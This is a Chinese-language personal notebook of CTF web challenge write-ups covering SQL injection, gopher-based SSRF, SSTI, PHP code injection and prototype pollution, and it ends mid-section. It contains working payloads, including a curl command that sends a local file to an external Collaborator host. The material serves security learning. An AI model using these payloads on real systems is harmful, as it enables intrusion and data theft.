# 做题思路
![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1684055051552-21b4d5bd-ce76-42c2-9d00-79758dc55ef8.jpeg)

- From  BIT
- Work hard to learn web security, reverse.
- I Love CTF and 

## 有提示的地方

`console`、查看源码、Git上找项目名称
## linux的关键目录

- 如果`/etc/passwd`中有`/bin/bash`
- 访问`/home/www/.bash_history`可以看到执行过的历史命令
## 语言或者框架
### .pl

- 找它的关键特征，如后缀，版本号
- 结合具体给出的信息，在网上找相关的漏洞
- 如给出后缀是`.pl`，存在文件上传界面，查`perl的文件上传`
### JSESSIONID

- java框架，加载`struct2`的相关目录

## fuzz测试
## 存在文件包含，可以查看源码
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1684117085992-fa58d411-00a5-4f4d-91e1-5530a533619c.png#averageHue=%23fdfafa&clientId=u692b80b7-f57b-4&from=paste&height=324&id=u3fd0519f&originHeight=647&originWidth=1374&originalType=binary&ratio=2&rotation=0&showTitle=false&size=70955&status=done&style=none&taskId=ua1102a26-0071-4a11-84d8-7a048c5c484&title=&width=687)

## 找到可以交互的地方

- 有可能出现在包的cookie处
- 404页面处
- 一切地方，**总之仔细看包**
## sql注入题
### 解题步骤

- 一般是有一个`register.php`和一个`login.php`
- 正常注册账号密码，登录进去
#### 找注入点
:::info

1. 一切我输入的东西，之后显示出来了，都说明存在交互，也就是都可能存在注入
2. 如果没有回显，可能需要盲注
:::
#### 注入点是登陆之后的信息
> **攻防世界 难度5 unfinish**

- 在注册界面是输入`email、username、password`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683366455492-950529a6-6c85-4443-969a-687077564044.png#averageHue=%23fdfcfc&clientId=uf3d3d679-8c5f-4&from=paste&height=381&id=u812acb41&originHeight=761&originWidth=1609&originalType=binary&ratio=2&rotation=0&showTitle=false&size=48979&status=done&style=none&taskId=u76307dd2-56b8-4754-af63-8153b90164e&title=&width=804.5)

- 这里发现输入只需要输入`email、password`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683366514601-85587276-7c46-41d4-b7d6-521d19fde33a.png#averageHue=%23e0c4a3&clientId=uf3d3d679-8c5f-4&from=paste&height=226&id=ud5546633&originHeight=452&originWidth=548&originalType=binary&ratio=2&rotation=0&showTitle=false&size=6568&status=done&style=none&taskId=ue5fbb362-0526-4dd6-b42d-3214096c62f&title=&width=274)

- 登录之后，发现显示了用户名，所有交互的界面，只有这里

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683366543989-a00f2dfb-39ca-4c30-9d9e-7b6e12fbd0ce.png#averageHue=%23363b4c&clientId=uf3d3d679-8c5f-4&from=paste&height=171&id=u6b9444ab&originHeight=341&originWidth=395&originalType=binary&ratio=2&rotation=0&showTitle=false&size=39030&status=done&style=none&taskId=uada80384-331f-40d2-a600-5a830bb0813&title=&width=197.5)

- 所有可能在username处存在注入
#### 测试可用的字符
:::info

1. 首先测试的时候要多试，到底过滤了没，比如遇到过如果注册成功包返回302，没成功返回200的。要用Burp试、hackbar试、登录框试
:::

- fuzz测试可用的字符
#### 命令闭合
##### insert 语句

- 比如注册时候填的信息是被insert到数据库中的
```sql
insert into user('username','password') values('$username','$password')
```

- 就可以用Mysql的运算闭合
- 输入
```sql
0'+select hex(database())+'0
```

- 之后就可以用`ascii + substr`爆破具体的信息
### addslashes

- addslashes后，在存入数据库时，并不会加入反斜杠，也就是你写啥就存啥
- 但是当你从数据库中再取出来用的时候，这时候我之前构造的sql语句就会执行
- **所以重点关注addslashes后，什么从数据库中取出来了**
## 文件上传题

- 攻防世界 filemanager
# 攻防世界 very_easy_sql(难度3) ssrf
## 思路
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681725693148-cdf5d3c6-1f0c-4163-ac54-3383624e4e4a.png#averageHue=%23fafaf9&clientId=u775767ba-4dce-4&from=paste&height=162&id=ud8dfee1e&originHeight=323&originWidth=1204&originalType=binary&ratio=2&rotation=0&showTitle=false&size=20016&status=done&style=none&taskId=u0618f0ac-7614-47e0-8b55-4181a4a5119&title=&width=602)

- 点进去之后，发现这显然是ssrf，之前学的ssrf都是直接ssrf+mysql或者ssrf+redis，这里有ssrf+mysql会显示no,no,no，显然不行

放弃，看wp
## wp
### 查看源码发现curl

- 由于最开始的index.php界面需要是内网用户，且需要输入密码，因此找到可以curl的地方。
- 查看源码，发现/use.php(草，太久没做，查看源码都忘了)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681725788452-900c5236-1204-49cb-96de-70365693c735.png#averageHue=%23fbfbfa&clientId=u775767ba-4dce-4&from=paste&height=203&id=kbwJy&originHeight=405&originWidth=952&originalType=binary&ratio=2&rotation=0&showTitle=false&size=42127&status=done&style=none&taskId=ue9cd70b6-76aa-45ee-a78f-9a8e2c48942&title=&width=476)
### gopher+弱密码登录

- 可以用gopher访问127.0.0.1:80的index.php界面，上脚本，尝试用gopher+弱密码登录。burp抓包，访问/use.php。
```python
import urllib.parse
import base64


host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"

# str = "admin') and extractvalue(1, concat(0x7e, (substr((select group_concat(flag) from flag), 20,50)),0x7e)) #"
# # 将字符串编码为bytes类型，然后使用base64.b64encode()函数进行Base64编码
# encoded_bytes = base64.b64encode(str.encode('utf-8'))

# # 将bytes类型的编码结果转换为字符串类型
# encoded_str = encoded_bytes.decode('utf-8')

content_length = len(content)
# cookie = f'this_is_your_cookie={encoded_str}'
test =\
"""POST /index.php HTTP/1.1
Host: {}
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".format(host,content_length, content)#\用于将字符串延续到下一行

tmp = urllib.parse.quote(test) 
new = tmp.replace("%0A","%0D%0A")#需要用%0d%0a换行
result = urllib.parse.quote(new) #二次url编码，因为php在收到后就进行了一次解码
print("gopher://"+host+"/_"+result)


```

- 此时有回显，发现cookie处是admin经过base64加密的结果

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681726145844-d463442a-6dba-49c0-ac59-2933580a9f10.png#averageHue=%23f0f0f0&clientId=u775767ba-4dce-4&from=paste&height=214&id=OnZgK&originHeight=428&originWidth=1216&originalType=binary&ratio=2&rotation=0&showTitle=false&size=29856&status=done&style=none&taskId=u42b121ff-4b78-4549-a28f-fe941222623&title=&width=608)
### cookie注入

- 在发的包里加一个`Cookie=this_is_your_cookie=此处填写base64_encode(注入的payload)`
- 这里用`admin')#`测试成功，很奇怪
- 发现可以报错注入，用extractvalue + 爆破信息的语句即可获得flag
## 总结

- 记得查看源代码
- ssrf主要用gopher，除了gopher + mysql，还可以`gopher://127.0.0.1:80/index.php`
- 要对构造gopher payload的脚本很熟悉
- Cookie注入之前没注意过，要多看包的信息。
- Cookie注入有`admin')#`这种闭合方式，多注意`)`。
# 攻防世界 mfw(难度3)代码审计
## 思路

- 首先`.git`可以下载源码
- 但是我忘记了`GitHack`可以查看源码
## wp

- 下载源码后，有`assert`函数，这个东西当成eval处理

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681912921411-f884b4be-db77-4614-bcdf-086130deaf1e.png#averageHue=%232c313d&clientId=uc4b40f47-08a4-4&from=paste&height=285&id=u1f31f4c6&originHeight=570&originWidth=1407&originalType=binary&ratio=2&rotation=0&showTitle=false&size=385756&status=done&style=none&taskId=ue617ca6b-0262-499d-8782-188b9de4878&title=&width=703.5)

- 所以这里可以通过闭合的方式注入
```php
page=') or system('/templates/flag.php')
page='.system("cat ./templates/flag.php").'
```
## 总结

- `or`可以用在字符串中，作用相当于`;`
- 可以用单行注释`# 或 //`,多行注释`/*`注释后面的内容
# 攻防世界 fakebook(难度3)sql注入+ssrf
## 思路

- 这个题我之前做过，现在做还是不会，感觉现在明白点了
## wp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681957475689-5ad73f96-19d2-4ba5-ae12-8d5bd8db7e75.png#averageHue=%23fefdfd&clientId=uc5536b36-62d0-4&from=paste&height=400&id=u11d79f28&originHeight=799&originWidth=2075&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75771&status=done&style=none&taskId=u9e6cf0c4-f9dd-4b66-ad63-45e9974d0e2&title=&width=1037.5)

- 注册之后，点击注册的用户，发现可能存在sql注入
- 用sqlmap扫，没扫出来，于是手动注册
- 内联注释绕过，发现是把数据序列化存入了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681957633874-fd8d1d36-2680-40c3-9dca-e36bf8c859b2.png#averageHue=%23fefefd&clientId=uc5536b36-62d0-4&from=paste&height=225&id=uedbf6dc5&originHeight=450&originWidth=2385&originalType=binary&ratio=2&rotation=0&showTitle=false&size=53495&status=done&style=none&taskId=u1abdd94b-b56a-426b-a516-b15f2cc38ae&title=&width=1192.5)

- 扫描后台，发现源码，这里有curl_exec，如果我把data的内容换了，是不是就可以读取flag.php了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681957666862-067fe424-11c7-4bfc-b774-c8ed1aca1302.png#averageHue=%23f2f1f0&clientId=uc5536b36-62d0-4&from=paste&height=354&id=u2330be84&originHeight=708&originWidth=950&originalType=binary&ratio=2&rotation=0&showTitle=false&size=34399&status=done&style=none&taskId=uc8fab84c-49b6-4f50-8af0-278536afbe0&title=&width=475)

- 通过union select 1,2,3,'序列化数据'，查看源码获得flag
## 总结

- 看到`curl_exec`想到file协议
- sql手动注入
- union select改数据
# 攻防世界 ics-05(难度3)php伪协议查看源码
## 思路

- 上来发现下面的页面，然后就不知道咋整了，尝试了很多种方法，这里其实应该想到，page=index，可能存在文件包含，用伪协议读取源码

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681978351642-048d6374-8880-478e-b5bf-e48e3953b97f.png#averageHue=%23fcfcfc&clientId=uee83148e-fe68-4&from=paste&height=434&id=u1dcd9e55&originHeight=868&originWidth=1921&originalType=binary&ratio=2&rotation=0&showTitle=false&size=84335&status=done&style=none&taskId=u19392342-0358-428f-8f1d-340b42ea75d&title=&width=960.5)
## wp

- 伪协议读源码
```php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
```

- 发现危险函数preg_replace，当`$pattern`指定模式为`/e`时，`$replacement`会被当做php代码执行
```php
$pattern=/test/e&$replacement=system('ls')&subject=test
```
# 攻防世界 simple-js(难度3)js代码审计
## 思路

- 知道是看代码，但是我看不下去，所以没做出来
- 其实认真看，这个题挺简单的
## wp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681994090360-a9e4cd81-d171-43ef-b92c-9573827de375.png#averageHue=%23fefdfc&clientId=uc95170e7-2377-4&from=paste&height=314&id=u7b43ee46&originHeight=628&originWidth=1935&originalType=binary&ratio=2&rotation=0&showTitle=false&size=99320&status=done&style=none&taskId=u94959de6-e53d-48ab-970f-7c468ca1b4d&title=&width=967.5)

- 审计代码，发现这个输出和输入没什么关系
- 有一个可疑的字符串，把它用python输出一下,得到一串数据

55,56,54,79,115,69,114,116,107,49,50

- 猜测可能是ASCII码值，再用chr函数转换一下，就行了
- 只审计代码，也可以，把tab2改成tab，也行。
# 攻防世界 easytornado(难度3) SSTI
## wp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1681996115763-b4e6ab04-be7e-452c-a26d-1586bafcfbfa.png#averageHue=%23fdfcfc&clientId=uc95170e7-2377-4&from=paste&height=138&id=u55366bc2&originHeight=304&originWidth=1219&originalType=binary&ratio=2&rotation=0&showTitle=false&size=38606&status=done&style=none&taskId=u277bb194-b6f9-4001-8a4c-68c786b45e6&title=&width=554.0908970813123)

- 测试后，发现这个界面，可能存在SSTI
# 攻防世界 shrine(难度3) SSTI
## 思路

- 这个题，我看出来是SSTI，但是试了半天，不知道如何获取配置文件

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682040760277-a6d37d9b-6aa0-44ee-8cc0-f29bb5a2bb48.png#averageHue=%23fdfafa&clientId=ub8272dd9-67b2-4&from=paste&height=166&id=udd8c6ed0&originHeight=332&originWidth=1116&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31440&status=done&style=none&taskId=u46e42df5-75dd-4b5f-b547-4e061fbfd6d&title=&width=558)

- 这里是把**变量名**为config的置为None
## wp

- 通过`__globals__`获取`app`，再获取配置文件
```python
{{url_for.__globals__['current_app'].config['FLAG']}}
```
## 总结
模板获取配置文件有3种方式

1. `{{self.__dict__}}`
2. `config`
3. `{{url_for.__globals__['current_app'].config['FLAG']}}`
# 攻防世界 wife_wife(难度4) 原型链污染
## 思路
**思路1：**

- 这个题只有登录，注册的界面
- 发现注册的地方，有isAdmin，要填邀请码，还不需要爆破
- 显然需要是isAdmin,才能获取flag
- 所以思路就是得把isAdmin改成true
- 那怎么改值，不会

**思路2：**

- 我以为下载的图片会有什么问题，但其实并没有
## wp
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682045715577-b030353f-b4fd-401e-bb84-51a3e5c108bd.png#averageHue=%23c6c4b2&clientId=u3005aeb6-fb14-4&from=paste&height=337&id=u7e3d989d&originHeight=674&originWidth=1358&originalType=binary&ratio=2&rotation=0&showTitle=false&size=361679&status=done&style=none&taskId=u962f3bf2-0345-46f6-9fff-52862808eda&title=&width=679)

- Object.assign() 是一个 JavaScript 函数，用于将一个或多个源对象的属性复制到目标对象中。它的语法如下：
```
Object.assign(target, ...sources)
```

- 其中，target 表示目标对象，sources 表示一个或多个源对象
```javascript
const target = { a: 1, b: 2 };
const source = { b: 4, c: 5 };

Object.assign(target, source);

console.log(target); // { a: 1, b: 4, c: 5 }
```

- 在上面的示例中，target 对象的属性 b 被源对象 source 的属性 b 覆盖了，属性 c 则被复制到了 target 对象中。
- 所以在注册的时候，添加一个`"__proto__":{"isAdmin":"true"}`
# 攻防世界 Cat(难度4) django
## 思路

- 我在测试的时候输入cat，显示了这个是ping的界面，用以前的；截断，那些管道符不行，我就没招了

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682236679366-0389a96c-5afe-4122-9463-c2a2f33ea5e3.png#averageHue=%23faf9f7&clientId=u4864fe20-f26f-4&from=paste&height=119&id=ub8ac47fe&originHeight=237&originWidth=1187&originalType=binary&ratio=2&rotation=0&showTitle=false&size=34112&status=done&style=none&taskId=ub6a4fde1-2c62-4d1e-b58a-8087a3d93f5&title=&width=593.5)
## wp
### fuzz测试

- 测试一下有哪些可用的字符，上脚本,这里用了多线程，能快点
```python
import requests
import concurrent.futures
url = "http://61.147.171.105:63663/index.php?url="

def test_char(i):
    r = requests.get(url + chr(i))
    if("Invalid URL" not in r.text):
        print(f"{i} {chr(i)}")
        
with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(32, 127):
        executor.submit(test_char, i)
```

- 测试之后，发现'@'字符可用。
- 之前在学`Burp Collaborator`时，用`@`可以读取文件信息。(md 实际上早都忘记了)
```shell
curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net
```
### 宽字节测试

- 用`%bf`试一下，发现报错了。首先发现是django框架，且说明后端用的是gbk编码，超过%F7的在gbk中不再有意义

![c67deb0358a6a6b65703381d8c33ff6.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682238284989-a1fe05a1-d891-4fee-8818-4e53ef2023b9.png#averageHue=%23fcf8f7&clientId=u4864fe20-f26f-4&from=paste&height=61&id=ua2d08e53&originHeight=122&originWidth=1791&originalType=binary&ratio=2&rotation=0&showTitle=false&size=16486&status=done&style=none&taskId=ua74248ea-b2e6-4ada-8959-d367933917b&title=&width=895.5)

- 接着根据报错信息，可以猜项目的路径是`/opt/api`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682238439656-d235582c-2789-4e13-8646-8bf419290da9.png#averageHue=%23fcfbfa&clientId=u4864fe20-f26f-4&from=paste&height=388&id=ub31274c3&originHeight=776&originWidth=1859&originalType=binary&ratio=2&rotation=0&showTitle=false&size=100651&status=done&style=none&taskId=uf16da378-a79c-424e-85c0-f623ec0df08&title=&width=929.5)
### django的特殊知识

- django项目下一般有个settings.py文件是设置网站数据库路径。
- 接着就是猜`settings.py`的路径，我自己照着wp做的时候，猜是

`url=@/opt/api/dnsapi/settings.py`,但是没反应

- 那就猜`url=@/opt/api/api/settings.py`
- 全局搜索`sqlite`，发现了疑似的数据库路径

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682238688856-5b76f466-1440-4da9-ba33-ac5d5c0c31e8.png#averageHue=%23fdfbfa&clientId=u4864fe20-f26f-4&from=paste&height=81&id=udf3334c6&originHeight=161&originWidth=1152&originalType=binary&ratio=2&rotation=0&showTitle=false&size=11157&status=done&style=none&taskId=u89044432-d188-4b3c-85b5-511361fa86e&title=&width=576)

- 访问`url=@/opt/api/database.sqlite3`,全局搜索ctf

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682238728784-a77a4caf-3713-4ce7-9026-be077fef89f7.png#averageHue=%23fbf8f5&clientId=u4864fe20-f26f-4&from=paste&height=45&id=u058231e8&originHeight=90&originWidth=617&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9359&status=done&style=none&taskId=u29e48e4e-3bd9-4e2a-a9a6-689be787829&title=&width=308.5)
**以下来自chatgpt：**

- Django 项目的 settings.py 文件通常位于项目根目录下，与项目的主要 Python 包（通常是包含 wsgi.py 文件的包）处于同一级别。
- 假设你的 Django 项目的根目录名为 myproject，那么 settings.py 文件的路径应该是：
```python
/myproject/myproject/settings.py
```

- 第一个 myproject 是项目的根目录，第二个 myproject 是包含 settings.py 文件的 Python 包的名称。如果你的项目名称不同，那么路径中的 myproject 部分应该替换为你的项目名称。
## 总结

- 框架的漏洞我还需要多总结
- 大致思路一般都是找配置文件，找日志，找数据库
- 之后把遇到的都总结一下
# 攻防世界 Confusion1(难度4) SSTI
## 思路

- 这个题我之前做过，所以有点印象，看这个图和python有关，所以想到SSTI

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682240783923-2a3d2bf4-ac5e-46f6-bf94-ab934244c6ce.png#averageHue=%23d4e0e6&clientId=u4864fe20-f26f-4&from=paste&height=489&id=uf8edd3e6&originHeight=977&originWidth=1380&originalType=binary&ratio=2&rotation=0&showTitle=false&size=311533&status=done&style=none&taskId=uba377df1-51ea-44a6-a881-8b3d49f84dc&title=&width=690)

- 但是我始终没有找到入口，在哪输入，其实我也测试了`/{{7*7}}`,但是我没有仔细看回显，其实在404的报错页面是有回显的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682240908378-4cbb8ff2-8f61-4926-8509-ca13d5fb5bd9.png#averageHue=%23f7f6f6&clientId=u4864fe20-f26f-4&from=paste&height=367&id=Tcc57&originHeight=734&originWidth=2296&originalType=binary&ratio=2&rotation=0&showTitle=false&size=93550&status=done&style=none&taskId=ub8b9e1ab-dee2-4ef3-9540-a7c591fe27c&title=&width=1148)

- 就差一点！！！！我好气
- 然后就直接上payload就行了
## 总结

- 一定要多看回显的信息，多看包！！！
# 攻防世界 FlatScience(难度4)SQlite注入
## 思路

- 这个题也是之前做过有点印象
- 需要先扫一下目录，扫出来有`login.php`和`admin.php`
- 测试一下，发现`login.php`界面可以sql注入
- 但是数据库是`sqlite`不是`mysql`
- 我测试的时候一直不行，因为没有**仔细看包的回显信息**，一定要记住这个！！
## wp

- 注入测试之后，发现提示`admin.php`的密码在pdf文件中。
- 这里需要查看源码，发现`sha1`加密
- 用`wget`下载所有pdf
- 写脚本提取每一个单词，判断单词的`Sha1`是否和数据库中的相等从而找到密码
## 脚本
```python
import PyPDF2
import nltk
from nltk.tokenize import word_tokenize
import os
import glob
import hashlib

def get_words(pdf_file):

    # 创建PyPDF2的PdfFileReader对象
    pdf_reader = PyPDF2.PdfFileReader(pdf_file)

    # 获取PDF文件中的所有页面数量
    num_pages = pdf_reader.getNumPages()

    # 创建一个空字符串，用于存储PDF文件中的所有文本zl
    pdf_text = ''

    # 循环遍历PDF文件中的每一页，并将内容添加到pdf_text中
    for page in range(num_pages):
        page_obj = pdf_reader.getPage(page)
        pdf_text += page_obj.extractText()

        # 使用nltk库的word_tokenize函数将pdf_text中的文本拆分为单词
        words = word_tokenize(pdf_text)

        for word in words:
            sha1 = hashlib.sha1()
            salt_word = word + "Salz!"
            sha1.update(salt_word.encode('utf-8'))
            encoded_text = sha1.hexdigest()
            if(encoded_text == '3fab54a50e770d830c0416df817567662a9dc85c'):
                return word
    return 

if __name__ == "__main__":
    current_dir = os.getcwd()

    # 构造一个搜索所有PDF文件的通配符
    pdf_glob = os.path.join(current_dir, '*.pdf')

    # 使用glob.glob函数获取所有PDF文件的文件名列表
    pdf_files = glob.glob(pdf_glob)


    for pdf_file in pdf_files:
        # 打印PDF文件名
        print(get_words(pdf_file))

   
```
## 总结

- 看源码
- 看包
# 攻防世界 md5爆破+file协议读
## 思路

- 上来发现这里需要验证码，我猜到是爆破，但是我没尝试
- 太可惜了，应该尝试一下的
## wp

- python写个多线程的脚本爆破，有三种方法

**方法1：**

- 这里最开始，我想按照之前那种多线程的方式写
```python
with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(1, 100000):
        executor.submit(test_char, i)
```

- 但是代码在循环中生成大量的任务，并将它们提交给线程池，此时会导致内存占用过多，容易卡死

**方法2：**
```python
tasks = [str(i) for i in range(1, max_num)]
```

- 使用了一个简单的列表推导式（List Comprehension）来生成任务列表，这种方式会一次性生成所有的任务，可能会导致内存占用过高。

**方法3：**

- 下面这个使用生成器动态生成，一次只生成一个任务，可以节约内存。
```python
max_num = 100000
    with concurrent.futures.ThreadPoolExecutor() as executor:
        # 使用生成器动态生成任务
        tasks = (str(i) for i in range(1, max_num))
        # 使用 map 方法并发执行任务
        for _ in executor.map(find_char, tasks):
            pass
```

- 这将生成一个生成器对象，它可以通过迭代器协议（Iterator Protocol）来逐个生成任务。在 ThreadPoolExecutor.map() 方法中，当生成器生成新的任务时，线程池会自动将任务提交给线程池进行执行，直到生成器生成的所有任务都执行完毕。
- **并发是指多个任务在同一时间段内交替执行**

完整代码：
```python
import concurrent.futures
import hashlib

def find_char(i):
    md5 = hashlib.md5()
    md5.update(i.encode('utf-8'))
    encode_string = md5.hexdigest()
    if(encode_string[-6:] == "359475"):
        print(i)
        exit()

    #4be21a

if __name__ == "__main__":
    max_num = 100000
    with concurrent.futures.ThreadPoolExecutor() as executor:
        # 使用生成器动态生成任务
        tasks = (str(i) for i in range(1, max_num))
        # 使用 map 方法并发执行任务
        for _ in executor.map(find_char, tasks):
            pass
```

- 由于不需要使用迭代器中的元素，只需要并发地执行任务，因此使用一个下划线 _ 来占位，并在循环中使用 pass 语句来跳过迭代器中的元素。**也就是**`**find_char**`**函数没有返回值**
- 如果有返回值的话，按照这么写
```python
for result in executor.map(find_char, tasks):
    print(result)
```

- 此时用`file`访问/etc/passwd，发现有回显

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682344089131-c2cc3a7f-7c98-4169-93fc-2298b3bfe77d.png#averageHue=%2389cef1&clientId=u49f41384-2d63-4&from=paste&height=361&id=uce5bd693&originHeight=721&originWidth=2303&originalType=binary&ratio=2&rotation=0&showTitle=false&size=166642&status=done&style=none&taskId=u02259f00-4ad6-451d-91fc-7a4724c1f73&title=&width=1151.5)

- 访问`file:///flag`，但是提示`hack`
- 对`flag`进行url编码(all-characters)，是可以获得flag的
### apache配置文件
:::info
**/etc/apache2/sites-enabled/000-default.conf **是 Apache Web服务器的配置文件之一，它通常用于指定默认的虚拟主机和网站配置。在Debian和Ubuntu系统中，Apache的默认虚拟主机配置文件通常被存储在此目录下，以便系统管理员可以轻松地添加、编辑或删除虚拟主机。
虚拟主机是一种机制，允许在同一物理服务器上托管多个网站，每个网站都可以拥有自己的域名、IP地址、文档根目录和配置。
**000-default.conf **是默认的虚拟主机配置文件名称，它通常包含一些基本的网站配置，例如文档根目录、错误日志位置、访问日志格式等等。系统管理员可以通过编辑该文件来更改默认的网站配置，或添加新的虚拟主机配置。

:::

- 这里发现有个`47852`端口，访问它的网站默认页面`index.php`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682390556122-b3f5061d-f27e-4c22-a84b-018f7da8c686.png#averageHue=%23efefef&clientId=ub8cee2a5-d0f4-4&from=paste&height=116&id=u1320b133&originHeight=231&originWidth=843&originalType=binary&ratio=2&rotation=0&showTitle=false&size=13603&status=done&style=none&taskId=ucf6457b4-9ea5-441c-bbc3-491b57b3b81&title=&width=421.5)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682390627075-2472284b-7935-4ecb-9fde-035dd49cc5d8.png#averageHue=%23fefefe&clientId=ub8cee2a5-d0f4-4&from=paste&height=134&id=ua48034b6&originHeight=268&originWidth=812&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9445&status=done&style=none&taskId=u94603c9a-0514-486d-9ddc-8c097233e73&title=&width=406)

- 这里有命令执行，用`gopher`发送Post包，将`cat /f* > /1`，读取文件

提示：`file:///f*`这样是不可以的，只有命令执行语句才可以用通配符
### url二次编码绕过对flag的过滤
:::info
我发现一个神奇的事情

- 用Hackbar、burpsuite就需要二次编码，符合我想的逻辑
- 但是直接在框里提交就一次编码就行了。
:::

- 看源码发现用`pref_match`在当前页面过滤了flag，但是我没看到源码
- 如果对`flag`进行二次编码，相当于php解析了一次，但是没有找到flag，所以绕过了
- 但是file协议是可以读url编码后的`flag`的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682409262172-e45c6f33-d642-4ec5-9786-2158e52d37d3.png#averageHue=%23738661&clientId=u461406b0-7f78-4&from=paste&height=477&id=u1800dbea&originHeight=954&originWidth=1397&originalType=binary&ratio=2&rotation=0&showTitle=false&size=85781&status=done&style=none&taskId=ue004b027-e23c-44e4-83ea-d2699666171&title=&width=698.5)
# 攻防世界 warmup(难度4) sql注入-别名
## 思路

- 这个题给了源码，我看了半天，发现禁用了许多字符，我以为就没有办法了
- 但是其实禁用的字符里面没有单引号，这里发现会对输入的字符进行转义

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682426604570-9ea03e77-2fe8-406b-b4e2-a6260a333c50.png#averageHue=%2323201f&clientId=uf403fb27-bb65-4&from=paste&height=104&id=uce3565be&originHeight=207&originWidth=947&originalType=binary&ratio=2&rotation=0&showTitle=false&size=44025&status=done&style=none&taskId=u9478d0d6-a3c4-4e93-ab0b-aac74670b57&title=&width=473.5)
## wp
```sql
"select username,password from ".$this->table." where username='".$this->username."' and password='".$this->password."'
```

- 其实就是绕过这个，可以直接用万能密码绕过的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682427290986-c63a60be-b474-4205-b606-babb2e74c404.png#averageHue=%23262220&clientId=uf403fb27-bb65-4&from=paste&height=192&id=u483b9242&originHeight=383&originWidth=1202&originalType=binary&ratio=2&rotation=0&showTitle=false&size=79377&status=done&style=none&taskId=u9ce7021e-b269-4c3a-b180-3ba356cc496&title=&width=601)

- 由于上面这里是查admin的密码是不是输对了，也学到了一个新的方式，用别名绕过，在table处，用select 构造一个表构造admin的密码是123,然后在username处输入`admin`，password处输入`123`就可以了
```sql
(select 'admin' username,'123' password)a
```
# 攻防世界 BadProgrammer(难度5)原型链污染
## 思路

- 这个题也是没什么发现，直接看wp
## wp

- dirsearch扫目录，发现`/static../`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683185712520-da91fec7-4b4d-4fbb-82c3-707f353c7ef1.png#averageHue=%23fafaf9&clientId=u3ca0fbff-d659-4&from=paste&height=336&id=ue14a846a&originHeight=672&originWidth=1481&originalType=binary&ratio=2&rotation=0&showTitle=false&size=87168&status=done&style=none&taskId=u3b2b1ed6-3728-4018-8c6d-c3ec438bf4a&title=&width=740.5)

- 看`package.json`有安装了什么包的信息

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683185807278-95b6e985-3273-4f2e-860d-ba909fdee559.png#averageHue=%23fdf8f8&clientId=u3ca0fbff-d659-4&from=paste&height=288&id=uf3d359e9&originHeight=576&originWidth=904&originalType=binary&ratio=2&rotation=0&showTitle=false&size=37803&status=done&style=none&taskId=u7e48c451-bc81-4889-9e49-d579b0b68f4&title=&width=452)

- 也就是说这个`express-fileupload`可能有问题，直接百度查`exp`
- 查看`app.js`

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1683185869818-a9b2edb8-4663-4586-a440-108749d10eee.png#averageHue=%23fdfdfc&clientId=u3ca0fbff-d659-4&from=paste&height=398&id=u120a58fc&originHeight=796&originWidth=1507&originalType=binary&ratio=2&rotation=0&showTitle=false&size=96687&status=done&style=none&taskId=ub9bd962c-65d8-4c62-abfd-79efb7c1d51&title=&width=753.5)

- 这里发现一个可以`post`提交的地方
- 用脚本post提交，将flag复制到可以查看的地方，`package.json`中发现项目的路径是`/app`
# ctfshow web681 sql注入-\转义
## 思路

- burp抓包，发现有查询

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1682909230067-1bce578b-c8d6-47db-bff4-e7b5771c0e47.png#averageHue=%23f7f7f7&clientId=u91a8eaa1-292a-4&from=paste&height=380&id=ue3dde33e&originHeight=760&originWidth=2358&originalType=binary&ratio=2&rotation=0&showTitle=false&size=66249&status=done&style=none&taskId=u88142d21-78b3-4524-a752-1adc387e4c5&title=&width=1179)

- 但是输入单引号显示不了，猜测后端可能把单引号置为空字符串""
- 也过滤了空格
- 这里我想了半天，不能闭合怎么办，也没想出来
## wp

- 用单引号把原来查询语句中的单引号转义
```sql
